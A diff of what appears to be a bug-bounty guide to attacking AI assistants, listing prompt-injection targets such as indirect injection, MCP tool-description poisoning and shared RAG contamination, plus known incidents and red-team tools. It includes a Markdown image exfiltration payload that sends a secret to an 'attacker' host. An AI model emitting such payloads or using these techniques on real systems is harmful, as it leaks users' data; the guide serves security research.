@@ -16,6 +16,7 @@ The bug bounty landscape shifted. Web2 classes still pay, but the newest, widest
 ## TL;DR for pros
 
 Stop fuzzing jailbreaks for points. Hunt:
+
 1. **Indirect injection with side-effect gadgets** (Markdown image render, URL preview, auto-open link).
 2. **MCP tool poisoning** via description-field smuggling.
 3. **Cross-tenant RAG contamination** in shared vector stores.
@@ -83,11 +84,13 @@ MCP (Model Context Protocol) went from Anthropic-only in late 2024 to industry s
 Payload lives in data the model reads — webpage, PDF, email, calendar invite, code comment, image OCR, audio transcription. Greshake et al. is still the canonical methodology.
 
 **Confirmed primitives:**
+
 - **Markdown image exfil** — `![](https://attacker/?data=SECRET)` renders → leak
 - **Auto-follow links** — agents with browsing will fetch attacker URLs
 - **Tool-call hijack** — poisoned tool result redirects next action
 
 **Real incidents (tracked):**
+
 - **EchoLeak** — CVE-2025-32711, zero-click M365 Copilot exfil, Aim Security, Jun 2025
 - **Notion AI** — Sept 2025, shared-page injection rendering attacker Markdown
 - **Gemini Workspace** — Mozilla 0Din, calendar-invite injection
@@ -126,6 +129,7 @@ Cisco + Robust Intelligence, Jan 2025: 100% attack success on HarmBench. Reasoni
 | **Agentic Radar** | Agent architecture mapping | Splx AI |
 
 Workflow:
+
 1. Promptfoo → triage surface
 2. Garak → automated probe pass
 3. PyRIT Crescendo → depth where Promptfoo/Garak flag interesting
